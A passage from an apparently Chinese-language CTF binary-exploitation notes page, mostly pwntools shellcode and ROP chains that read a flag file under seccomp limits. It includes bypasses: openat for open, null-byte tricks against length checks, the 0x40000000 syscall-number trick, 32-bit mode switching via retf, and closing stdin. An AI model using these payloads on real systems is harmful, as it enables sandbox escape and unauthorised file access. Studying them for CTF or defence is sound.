</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>shl eax, 28
</span></span></span><span class=line><span class=cl><span class=s2>jo $-0x30
</span></span></span><span class=line><span class=cl><span class=s2>mov dh, 0x80
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x1e /* shmat */
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>jmp rax ; 进入shell_main执行
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>shell_main</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span>\
</span></span><span class=line><span class=cl><span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>lea rsp, [rip + 0x800]
</span></span></span><span class=line><span class=cl><span class=s2>mov r8, rsp
</span></span></span><span class=line><span class=cl><span class=s2>add r8, 0x200
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=si>{</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=si>{</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s2>&#34;rax&#34;</span><span class=p>,</span> <span class=s2>&#34;r8&#34;</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=si>{</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;r8&#34;</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>shell1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>shell2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>shell_main</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>shell3</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=orw-bypass>orw bypass</h3><p><strong>Open syscall shellcode</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># open调用 21字节 ret会进入0x67616c66出错</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    mov rdi, 0x67616c66     /* &#39;flag&#39;*/
</span></span></span><span class=line><span class=cl><span class=s2>    push rdi
</span></span></span><span class=line><span class=cl><span class=s2>    mov rdi, rsp
</span></span></span><span class=line><span class=cl><span class=s2>    xor esi, esi            /* O_RDONLY = 0 */
</span></span></span><span class=line><span class=cl><span class=s2>    mov eax, 0x2
</span></span></span><span class=line><span class=cl><span class=s2>    syscall
</span></span></span><span class=line><span class=cl><span class=s2>    ret
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># open调用 21字节 ret 会返回源程序</span>
</span></span><span class=line><span class=cl><span class=n>shellcode2</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    lea rdi, [rip+flag]
</span></span></span><span class=line><span class=cl><span class=s2>    xor esi, esi            /* O_RDONLY = 0 */
</span></span></span><span class=line><span class=cl><span class=s2>    mov eax, 0x2            /* open syscall */
</span></span></span><span class=line><span class=cl><span class=s2>    syscall
</span></span></span><span class=line><span class=cl><span class=s2>    ret                     /* 为了返回源程序 */
</span></span></span><span class=line><span class=cl><span class=s2>flag: .ascii &#34;flag&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span> <span class=c1># 使用该情况要注意shellcode前后影响因素，flag后加入b&#39;\x00&#39;及前方加入b&#39;\x90&#39;(nop)</span></span></span></code></pre></div></div><p><strong>ORW</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=mh>0xdead</span>
</span></span><span class=line><span class=cl><span class=n>flag_addr</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>+</span> <span class=mh>0x100</span> <span class=c1># flag硬写入内存中</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    mov rax, 2
</span></span></span><span class=line><span class=cl><span class=s2>    mov rdi, </span><span class=si>{</span><span class=n>flag_addr</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    mov rsi, 0
</span></span></span><span class=line><span class=cl><span class=s2>    syscall
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>    mov rdi, 3
</span></span></span><span class=line><span class=cl><span class=s2>    mov rsi, </span><span class=si>{</span><span class=n>flag_addr</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    mov rdx, 0x40
</span></span></span><span class=line><span class=cl><span class=s2>    syscall
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    mov rax, 1
</span></span></span><span class=line><span class=cl><span class=s2>    mov rdi, 1
</span></span></span><span class=line><span class=cl><span class=s2>    syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span> <span class=c1># 第二次读需要重新覆盖前面0x10地址</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>pay</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/flag</span><span class=se>\x00\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># 可能需要gdb微调在前后加\x00或\x90使刚好对应地址读取flag而不是flagxx</span></span></span></code></pre></div></div><p>通过 ROP 使用 orw 读 flag 操作</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>free_hook</span><span class=p>,</span><span class=mi>4</span><span class=p>)</span>    <span class=c1>//需要输入flag，替代free_hook地址
</span></span></span><span class=line><span class=cl><span class=c1>//栈：pop_rdi_ret 0 pop_rsi_ret free_hook_addr pop_rdx_ret 4 read_addr
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>open</span><span class=p>(</span><span class=n>free_hook</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span>      <span class=c1>//打开flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>read</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>free_hook</span><span class=p>,</span><span class=mi>100</span><span class=p>)</span>  <span class=c1>//读flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>puts</span><span class=p>(</span><span class=n>free_hook</span><span class=p>)</span>        <span class=c1>//输出flag
</span></span></span></code></pre></div></div><p>读 flag 到某个地方</p><ol><li><code>libc.['environ']</code>，是<code>libc</code>存储的栈地址</li><li><code>libc</code>的<code>bss</code>段，将<code>libc</code>放入<code>IDA</code>中查看即可</li><li><code>__free_hook </code>，<code>__free_hook</code>是<strong>全局变量</strong>，可直接被修改</li></ol><p><strong>其余绕过</strong></p><p>① 禁用 SYS_open ，用 SYS_openat 代替</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	# define __NR_openat 257 rax
</span></span></span><span class=line><span class=cl><span class=cm>	# define AT_FDCWD -100 rdi
</span></span></span><span class=line><span class=cl><span class=cm>	# define O_RDONLY 00 rdx
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>syscall</span><span class=p>(</span><span class=n>__NR_openat</span><span class=p>,</span> <span class=n>AT_FDCWD</span><span class=p>,</span> <span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span></span></span></code></pre></div></div><p>libc 中的 open 函数底层实现调用的是 openat 系统调用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Open FILE with access OFLAG.  If O_CREAT or O_TMPFILE is in OFLAG,
</span></span></span><span class=line><span class=cl><span class=cm>   a third argument is the file protection.  */</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>__libc_open64</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=kt>int</span> <span class=n>oflag</span><span class=p>,</span> <span class=p>...)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>mode</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>__OPEN_NEEDS_MODE</span><span class=p>(</span><span class=n>oflag</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>va_list</span> <span class=n>arg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>va_start</span><span class=p>(</span><span class=n>arg</span><span class=p>,</span> <span class=n>oflag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>mode</span> <span class=o>=</span> <span class=nf>va_arg</span><span class=p>(</span><span class=n>arg</span><span class=p>,</span> <span class=kt>int</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>va_end</span><span class=p>(</span><span class=n>arg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>SYSCALL_CANCEL</span><span class=p>(</span><span class=n>openat</span><span class=p>,</span> <span class=n>AT_FDCWD</span><span class=p>,</span> <span class=n>file</span><span class=p>,</span> <span class=n>oflag</span> <span class=o>|</span> <span class=n>EXTRA_OPEN_FLAGS</span><span class=p>,</span> <span class=n>mode</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>② <code>strlen</code>获取 shellcode 长度，可采取<code>\x00</code>开头的指令截断绕过长度判断</p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mo>00</span> <span class=mi>40</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rax</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span>
</span></span><span class=line><span class=cl><span class=mo>00</span> <span class=mi>41</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rcx</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span>
</span></span><span class=line><span class=cl><span class=mo>00</span> <span class=mi>42</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rdx</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span>
</span></span><span class=line><span class=cl><span class=mo>00</span> <span class=mi>43</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbx</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span>
</span></span><span class=line><span class=cl><span class=mo>00</span> <span class=mi>45</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span>
</span></span><span class=line><span class=cl><span class=mo>00</span> <span class=mi>46</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rsi</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span>
</span></span><span class=line><span class=cl><span class=mo>00</span> <span class=mi>47</span> <span class=mo>00</span>                 <span class=n>add</span>    <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rdi</span><span class=o>+</span><span class=mh>0x0</span><span class=p>],</span>  <span class=n>al</span></span></span></code></pre></div></div></li></ul><p>③ 4 字节系统调用号绕过</p><p>当所有可利用系统调用号被禁了，但由于无判断<code>sys_number >= 0x40000000</code>的情况，因此可以通过<code>0x40000000|sys_number</code>来绕过，<code>sys_number</code>为 64 位的系统调用号</p><p>④ 沙箱缺少对架构的判断</p><ul><li>白名单只允许<code>read, write, brk, mprotect, fstat</code>函数，64 位下<code>fstat</code>调用号与 32 位下<code>open</code>调用号相同</li><li>可以切换到 32 位下调用<code>open</code>系统通过调用，x86 架构的 CPU 根据<strong>CS 段寄存器对应的段描述符中的属性</strong>确定访问指令是 32 还是 64 位</li><li>32 位 CS 为 0x23，64 位 CS 为 0x33</li><li>rdi 寄存器需要指向 shellcode 地址，shellcode 地址需要小于 0x100000000，rsp 需要小于 0x100000000</li><li>下为 shellcode 内容：</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 切换到32位</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    mov rsp, 0x404000+0x500 # 地址位于中间, 不超过4字节
</span></span></span><span class=line><span class=cl><span class=s1>    mov r8, 0x23
</span></span></span><span class=line><span class=cl><span class=s1>    shl r8, 0x20 # 0x23进入高32位下
</span></span></span><span class=line><span class=cl><span class=s1>    mov rax, rdi # 赋给rax shellcode地址
</span></span></span><span class=line><span class=cl><span class=s1>    add rax, 0x1e # payload1的长度, rax指向payload2起始地址
</span></span></span><span class=line><span class=cl><span class=s1>    or rax, r8 # rax高32位为0x23，低32位为payload2起始地址
</span></span></span><span class=line><span class=cl><span class=s1>    push rax
</span></span></span><span class=line><span class=cl><span class=s1>    retf # 读取栈上前8字节，低4字节作为跳转地址，高4字节作为新的CS
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=n>payload1</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>bits</span><span class=o>=</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;shellcode1: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>payload1</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>bits</span><span class=o>=</span><span class=mi>64</span><span class=p>))))</span> <span class=c1># 0x1e</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    mov edx, eax # payload2起始地址
</span></span></span><span class=line><span class=cl><span class=s1>    push 0x1010101
</span></span></span><span class=line><span class=cl><span class=s1>    xor dword ptr [esp], 0x1016660 # 得到0x6761:ga
</span></span></span><span class=line><span class=cl><span class=s1>    push 0x6c662f2e # lf/.
</span></span></span><span class=line><span class=cl><span class=s1>    				# ./flag
</span></span></span><span class=line><span class=cl><span class=s1>    mov ebx, esp # ./flag 字符串地址
</span></span></span><span class=line><span class=cl><span class=s1>    xor ecx, ecx
</span></span></span><span class=line><span class=cl><span class=s1>    mov eax, 5
</span></span></span><span class=line><span class=cl><span class=s1>    int 0x80 # open(&#39;./flag&#39;, 0)
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    push 0x33
</span></span></span><span class=line><span class=cl><span class=s1>    add edx, 0x25 # payload2长度
</span></span></span><span class=line><span class=cl><span class=s1>    push edx # 高32位为0x33，低32位为payload3起始地址
</span></span></span><span class=line><span class=cl><span class=s1>    retf
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=n>payload2</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;i386&#39;</span><span class=p>,</span> <span class=n>bits</span><span class=o>=</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;shellcode2: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>payload2</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;i386&#39;</span><span class=p>,</span> <span class=n>bits</span><span class=o>=</span><span class=mi>32</span><span class=p>))))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    mov rdi,rax # 3
</span></span></span><span class=line><span class=cl><span class=s1>    mov rsi,rsp # rsp为flag字符串地址
</span></span></span><span class=line><span class=cl><span class=s1>    mov edx,0x100
</span></span></span><span class=line><span class=cl><span class=s1>    xor eax,eax
</span></span></span><span class=line><span class=cl><span class=s1>    syscall	# read(3, addr, 0x100)
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    mov edi,1
</span></span></span><span class=line><span class=cl><span class=s1>    mov rsi,rsp
</span></span></span><span class=line><span class=cl><span class=s1>    push 1
</span></span></span><span class=line><span class=cl><span class=s1>    pop rax
</span></span></span><span class=line><span class=cl><span class=s1>    syscall # write(1, addr, 0x100)
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=n>payload3</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>bits</span><span class=o>=</span><span class=mi>64</span><span class=p>)</span></span></span></code></pre></div></div><p>⑤ close 绕过 fd 参数检查</p><ul><li><p>禁用<code>open</code>、<code>execve</code>，允许<code>exit_group</code>，若为<code>read</code>：<strong>fd 只能为 0</strong></p></li><li><p>绕过：openat 代替 open，通过将<strong>stdin 关闭</strong>绕过 fd 检查，打开文件返回的句柄 fd 则为 0</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>fd</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>A</span> <span class=o>!=</span> <span class=mh>0x0</span><span class=p>)</span> <span class=n>goto</span> <span class=mi>0016</span> <span class=c1># return KILL</span></span></span></code></pre></div></div></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rax; ret;&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rdi; ret;&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;syscall; ret;&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span> <span class=c1># close</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><p>ORW_ROP，栈迁移到写入 rop 的地址</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1>#payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x100)+p64(libc.sym[&#39;write&#39;])</span></span></span></code></pre></div></div><p><strong>32 位</strong></p><p>外平栈：函数开头 push 了函数参数参数导致栈发生改变，函数外通过<code>pop arg; pop arg; ret</code>或<code>add esp, xxh</code>等指令平衡栈——Linux</p><p>内平栈：函数内结尾通过<code>pop arg; pop arg; ret</code>或<code>add esp, xxh</code>等指令平衡栈</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 利用rop row</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>])</span>
